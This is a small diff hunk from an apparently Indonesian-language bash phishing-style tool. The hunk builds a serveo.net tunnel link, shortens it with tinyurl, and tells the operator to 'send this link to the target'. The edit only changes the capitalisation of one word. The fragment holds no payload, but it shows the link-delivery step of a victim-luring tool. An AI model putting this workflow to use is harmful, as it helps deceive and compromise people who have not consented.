@@ -257,7 +257,7 @@ printf "\n"
 sleep 4 # &
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 printf "\n"
-printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Kirim Nih Link ke Target:\e[0m\e[1;77m %s \n' $send_link
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Kirim Nih Link ke target:\e[0m\e[1;77m %s \n' $send_link
 send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link)
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] atau Lewat Shortlink:\e[0m\e[1;77m %s \n' $send_ip
 printf "\n"
